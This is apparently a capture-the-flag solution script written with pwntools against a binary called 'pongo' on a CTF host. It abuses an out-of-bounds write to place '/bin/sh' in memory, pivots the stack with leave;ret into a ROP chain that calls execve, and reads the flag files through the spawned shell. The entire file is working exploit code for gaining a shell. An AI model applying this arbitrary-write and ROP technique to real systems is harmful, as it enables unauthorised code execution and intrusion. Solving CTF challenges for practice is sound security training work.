#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./pongo")


def start(argv=[], *a, **kw):
    host = args.HOST or 'pongo.ctfz.one'
    port = int(args.PORT or 3337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()

pop_rdx = 0x00487bfd
pop_rsi = 0x0041cfd8
pop_rdi = 0x004664ac
pop_rax = 0x0040cce6
syscall = 0x0045f5c9
leave_ret = 0x00487333

# get rsp from debug trace and notice that it is static
# choose option 2
# enter "aabbccdd"
leak_rsp = 0xc00005ee20
saved_rip = leak_rsp + 0x158
writable = elf.bss(0x10000)


def aaw(addr, data):
    io.sendlineafter(b">>> ", b"1")
    io.sendlineafter(b"): ", b"-3")
    io.sendlineafter(b"num: ", str(addr).encode())
    io.sendlineafter(b">>> ", b"2")
    io.send(data)


bin_sh_addr = writable + 0x200
aaw(bin_sh_addr, b"/bin/sh")

chain = [
    leave_ret + 1,
    leave_ret + 1,
    pop_rdx, 0,
    pop_rsi, 0,
    pop_rdi, bin_sh_addr,
    pop_rax, 0x3b,
    syscall,
]

chain = list(map(p32, chain))

for i in range(len(chain)):
    print(i)
    aaw(writable + i * 0x8, chain[i])

aaw(saved_rip - 0x8, p32(writable).ljust(7, b"\x00"))
aaw(saved_rip, p32(leave_ret))

ori_shellcode = saved_rip + 0x31d8
aaw(ori_shellcode, asm("ret"))

io.sendlineafter(b">>> ", b"3")

io.sendline(b"cat /app/flag*")
io.interactive()
